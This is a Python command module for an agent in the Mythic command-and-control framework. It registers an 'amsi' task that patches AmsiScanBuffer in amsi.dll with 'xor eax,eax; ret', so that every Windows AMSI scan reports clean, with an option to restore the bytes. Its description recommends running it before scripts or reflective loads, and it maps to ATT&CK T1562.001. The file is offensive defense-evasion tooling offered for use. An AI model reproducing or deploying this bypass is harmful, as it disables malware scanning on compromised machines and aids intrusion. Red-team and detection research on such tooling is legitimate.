from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class AmsiArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["patch", "unpatch"],
                default_value="patch",
                description="patch: xor eax,eax;ret on AmsiScanBuffer (AMSI_RESULT_CLEAN always returned). unpatch: restore original bytes.",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=0, required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)


class AmsiCommand(CommandBase):
    cmd = "amsi"
    needs_admin = False
    help_cmd = "amsi -action patch|unpatch"
    description = (
        "Patch AmsiScanBuffer in amsi.dll (xor eax,eax; ret) to bypass AMSI scanning. "
        "Returns AMSI_RESULT_CLEAN (0) for all scans. "
        "Use before running scripts or reflective loads. Use 'unpatch' to restore."
    )
    version = 1
    author = "@0xbbuddha"
    argument_class = AmsiArguments
    attackmapping = ["T1562.001"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action = taskData.args.get_arg("action") or "patch"
        response.DisplayParams = f"action={action}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
